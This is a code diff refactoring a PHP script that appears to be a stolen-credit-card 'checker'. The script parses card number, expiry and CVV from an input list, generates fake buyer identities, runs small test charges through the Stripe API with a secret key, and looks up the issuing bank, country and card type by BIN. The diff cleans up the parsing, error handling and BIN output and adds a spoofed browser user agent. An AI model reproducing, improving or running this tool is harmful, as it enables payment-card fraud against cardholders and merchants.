@@ -19,22 +19,20 @@ function multiexplode($delimiters, $string) {
 }
 
 function GetStr($string, $start, $end) {
-    if (strpos($string, $start) === false || strpos($string, $end) === false) {
-        return "";
-    }
+    if (strpos($string, $start) === false || strpos($string, $end) === false) return "";
     $str = explode($start, $string);
     $str = explode($end, $str[1]);
     return $str[0];
 }
 
 // --- PARSE CC DATA ---
-$cc_parts = multiexplode(array(":", "|", " "), $lista);
-$cc = $cc_parts[0] ?? '';
+$cc_parts = multiexplode([":", "|", " "], $lista);
+$cc  = $cc_parts[0] ?? '';
 $mes = $cc_parts[1] ?? '';
 $ano = $cc_parts[2] ?? '';
 $cvv = $cc_parts[3] ?? '';
 
-// --- RANDOM USER DATA (USING CURL) ---
+// --- RANDOM USER DATA ---
 $ch_user = curl_init();
 curl_setopt($ch_user, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
 curl_setopt($ch_user, CURLOPT_RETURNTRANSFER, 1);
@@ -52,15 +50,15 @@ if ($get) {
     $last = $matches2[1][0] ?? 'Doe';
 }
 
+// --- SET DEFAULT USER AGENT ---
+$user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/141.0.0.0 Safari/537.36';
+
 // --- STRIPE API CALLS ---
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_USERPWD, $sk . ':');
-
-// Add proxy if needed
-// curl_setopt($ch, CURLOPT_PROXY, "http://username-session-123:password@proxy.zyte.com:22225");
 
 // --- CREATE SOURCE ---
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
@@ -88,7 +86,8 @@ if ($token3) {
     curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
     curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=50&currency=usd&customer='.$token3);
     $result3 = curl_exec($ch);
-    $chtoken = trim(strip_tags(GetStr($result3, '"id": "','"')));
+    $char = json_decode($result3, true);
+    $chtoken = $char['id'] ?? null;
 } else {
     $result3 = "{}";
 }
@@ -101,30 +100,30 @@ if ($chtoken) {
 }
 
 // --- BIN LOOKUP ---
-$cctwo = substr("$cc", 0, 6);
+$cctwo = substr($cc, 0, 6);
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
+curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo);
 curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Host: lookup.binlist.net',
-'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
-'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
-));
+curl_setopt($ch, CURLOPT_HTTPHEADER, [
+    'Host: lookup.binlist.net',
+    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+    'Accept: application/json'
+]);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, '');
 $fim = curl_exec($ch);
 $fim = json_decode($fim,true);
-$bank = $fim['bank']['name'];
-$country = $fim['country']['alpha2'];
-$type = $fim['type'];
 
-if(strpos($fim, '"type":"credit"') !== false) {
-  $type = 'Credit';
-} else {
-  $type = 'Debit';
-}
+// --- SAFELY EXTRACT BIN INFO ---
+$bank    = $fim['bank']['name'] ?? 'Unknown';
+$country = $fim['country']['alpha2'] ?? 'XX';
+$type    = strtolower($fim['type'] ?? 'debit') === 'credit' ? 'Credit' : 'Debit';
+
+echo "Bank: $bank\n";
+echo "Country: $country\n";
+echo "Type: $type\n";
+
 
 // --- RESPONSE LOGIC ---
 if(strpos($result3, '"seller_message": "Payment complete."' )) {
